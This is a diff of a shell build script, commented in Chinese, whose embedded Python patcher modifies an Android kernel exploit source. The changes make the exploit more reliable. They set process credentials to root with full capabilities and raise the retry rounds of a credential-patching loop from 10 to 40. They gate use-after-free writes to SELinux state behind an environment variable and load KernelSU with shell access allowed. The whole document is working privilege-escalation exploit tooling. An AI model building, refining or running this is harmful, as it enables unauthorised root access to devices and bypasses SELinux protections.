@@ -81,7 +81,7 @@ grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/
 # —— 策略补丁 ——
 # 默认路径（不设 C99491_PERMISSIVE）完全不写 selinux_state：
 # 实测在 Enforcing 下往 selinux_state 写会卡死设备。
-# 命中次数已在本地用 node 数过：1 / 2 / 2(regex) / 2 / 1。
+# 命中次数已在本地用 node 数过。
 python3 - "$T/ctest.c" <<'PY'
 import io
 import re
@@ -96,7 +96,7 @@ def sub_n(text, old, new, what, want):
         raise SystemExit("补丁失败：%s 期望 %d 次，实际 %d 次" % (what, want, n))
     return text.replace(old, new)
 
-# 1) uid/euid/fsuid 一起改 0，并补全能力位（exec 后靠 ambient 保住）
+# 1) uid/euid/fsuid 一起改 0，并补全能力位
 src = sub_n(
     src,
     "    patch_agent(pid, cred, 0, 1);\n",
@@ -105,7 +105,16 @@ src = sub_n(
     1,
 )
 
-# 2) permissive 只在显式要求时尝试
+# 2) patch_agent 的重试轮数 10 -> 40（实测 10 轮内 uid/euid/fsuid 经常全 miss）
+src = sub_n(
+    src,
+    "    for (int r = 0; r < 10; r++) {\n        long t0 = now_ms();\n",
+    "    for (int r = 0; r < 40; r++) {\n        long t0 = now_ms();\n",
+    "patch_agent 轮数 40",
+    1,
+)
+
+# 3) permissive 只在显式要求时尝试
 src = sub_n(
     src,
     "    if (try_permissive(st) < 0) {",
@@ -114,7 +123,7 @@ src = sub_n(
     2,
 )
 
-# 3) initialized 写同样关掉（两处缩进不同：8 与 12，必须用正则）
+# 4) initialized 写同样关掉（两处缩进不同：8 与 12）
 src, n = re.subn(
     r"uaf_write_once\(st \+ 1, 1024, 0\);",
     "if (getenv(\"C99491_PERMISSIVE\")) uaf_write_once(st + 1, 1024, 0);",
@@ -123,7 +132,7 @@ src, n = re.subn(
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 
-# 4) 装载方式：手工符号表 -> ksud late-load
+# 5) 装载方式：手工符号表 -> ksud late-load
 src = sub_n(
     src,
     "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
@@ -132,7 +141,7 @@ src = sub_n(
     2,
 )
 
-# 5) caps 修补轮数 12 -> 40
+# 6) caps 修补轮数 12 -> 40
 src = sub_n(
     src,
     "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
@@ -142,7 +151,7 @@ src = sub_n(
 )
 
 io.open(path, "w", encoding="utf-8").write(src)
-print("策略补丁已应用：root+caps / 不写 selinux_state / ksud 装载 / caps 40 轮")
+print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / ksud 装载")
 PY
 
 # —— Android system_properties 垫片 ——
@@ -203,7 +212,7 @@ build tinycred   "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
-  echo "patches=root+caps,no-selinux-write,ksud-load,caps-rounds40"
+  echo "patches=root+caps40,patch_agent40,no-selinux-write,ksud-load"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
